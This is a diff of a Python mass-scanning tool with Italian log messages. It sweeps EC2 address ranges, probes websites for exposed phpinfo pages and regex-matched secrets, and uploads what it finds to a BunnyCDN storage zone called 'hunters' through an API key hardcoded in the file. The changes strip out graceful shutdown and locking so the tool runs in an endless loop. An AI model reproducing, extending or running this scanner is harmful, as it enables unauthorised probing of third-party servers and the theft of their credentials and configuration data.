@@ -8,9 +8,8 @@ import random
 import ipaddress
 import socket
 import time
-import signal
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Thread, Lock, Event
+from threading import Thread
 
 from gevent import monkey
 monkey.patch_all()
@@ -57,20 +56,17 @@ LOG_PATH = None
 LOG_UPLOAD_INTERVAL = 300
 LOG_ACTIVE = True
 
-_ERROR_LOG_LOCK = Lock()
-_SHUTDOWN_EVENT = Event()
-
 BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/hunters"
 BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc"
 
 DNS_WORKERS_EC2 = 100
 DNS_TIMEOUT_EC2 = 3
-MAX_IPS_PER_CIDR = 20
+MAX_IPS_PER_CIDR = 5
 
 TOTAL_SLOTS = 2000
 NUM_WORKERS = 10
 
-_CONTAINER_NAME = os.environ.get('HOSTNAME', f'test_{int(time.time())}')
+_CONTAINER_NAME = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
 _SLOT_HASH = int(hashlib.md5(_CONTAINER_NAME.encode()).hexdigest()[:12], 16)
 INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS
 
@@ -109,9 +105,8 @@ def upload_file_to_bunny(local_path, remote_path, max_retries=3):
                 print(f"[BUNNY UPLOAD] ❌ Upload FALLITO definitivamente {remote_path}: {e}", flush=True)
     if last_error:
         try:
-            with _ERROR_LOG_LOCK:
-                with open(os.path.join('risultati', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
-                    f.write(f"Error uploading to Bunny Storage ({remote_path}): {last_error}\n")
+            with open(os.path.join('risultati', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
+                f.write(f"Error uploading to Bunny Storage ({remote_path}): {last_error}\n")
         except:
             pass
     return False
@@ -157,16 +152,20 @@ def generate_list_phpprofile_from_json_multi(site_link):
         yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 20]]
 
 def content_diablo_resp(req):
-    try:
-        content = req.content
-        if isinstance(content, str):
-            return content
-        return content.decode('utf-8', errors='replace')
-    except Exception:
+    if sys.version_info[0] < 3:
         try:
-            return req.text or ''
-        except Exception:
-            return ''
+            try: return str(req.content)
+            except:
+                try: return str(req.content.encode('utf-8'))
+                except: return str(req.content.decode('utf-8'))
+        except: return str(req.text)
+    else:
+        try:
+            try: return str(req.content.decode('utf-8'))
+            except:
+                try: return str(req.content.encode('utf-8'))
+                except: return str(req.text)
+        except: return str(req.content)
 
 def get_initial_url(url):
     if url.startswith('http://') or url.startswith('https://'):
@@ -268,9 +267,8 @@ def process_urls(urls_list, is_fallback=False):
 
         except Exception as e:
             try:
-                with _ERROR_LOG_LOCK:
-                    with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
-                        f.write(str(e) + '\n')
+                with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
+                    f.write(str(e) + '\n')
             except:
                 pass
 
@@ -339,7 +337,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     if regex_found:
 
                         print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
-                        rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=18))
+                        rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
 
                         saved_file_path = None
                         remote_subpath = None
@@ -461,7 +459,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                                         formatted_output += f"{clean_key} \t {var_value}\n"
                                             if formatted_output:
                                                 print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
-                                                rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=18))
+                                                rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
 
                                                 saved_file_path = None
                                                 remote_subpath = None
@@ -506,8 +504,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
 
     except Exception as e:
         try:
-            with _ERROR_LOG_LOCK:
-                with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
+            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
         except:
             pass
 
@@ -689,25 +686,18 @@ def main():
 
     def worker_loop(worker_id):
         cycle = 0
-        while not _SHUTDOWN_EVENT.is_set():
+        while True:
             cycle += 1
             gather_and_scan_cycle(cidr_pool, worker_id, NUM_WORKERS, cycle)
             print(f"[W{worker_id}] Ciclo #{cycle} completato.", flush=True)
-        print(f"[W{worker_id}] Shutdown ricevuto. Uscita pulita.", flush=True)
 
     def log_upload_loop():
-        while not _SHUTDOWN_EVENT.wait(timeout=LOG_UPLOAD_INTERVAL):
+        while True:
+            time.sleep(LOG_UPLOAD_INTERVAL)
             try:
                 upload_log_to_bunny()
             except Exception:
                 pass
-
-    def _signal_handler(sig, frame):
-        print(f"\n[SYSTEM] Segnale {sig} ricevuto. Avvio shutdown graceful...", flush=True)
-        _SHUTDOWN_EVENT.set()
-
-    signal.signal(signal.SIGINT, _signal_handler)
-    signal.signal(signal.SIGTERM, _signal_handler)
 
     threads = []
     for w in range(NUM_WORKERS):
@@ -722,22 +712,7 @@ def main():
     print(f"[SYSTEM] Tutti i {NUM_WORKERS} worker + upload log avviati. Loop infinito.", flush=True)
 
     for t in threads:
-        while t.is_alive() and not _SHUTDOWN_EVENT.wait(timeout=1.0):
-            pass
-
-    log_thread.join(timeout=5.0)
-
-    print("[SYSTEM] Upload log finale...", flush=True)
-    try:
-        upload_log_to_bunny()
-    except Exception:
-        pass
-
-    tee = sys.stdout
-    if isinstance(tee, TeeLogger):
-        tee.close()
-
-    print("[SYSTEM] Shutdown completato.", flush=True)
+        t.join()
 
 if __name__ == '__main__':
     main()
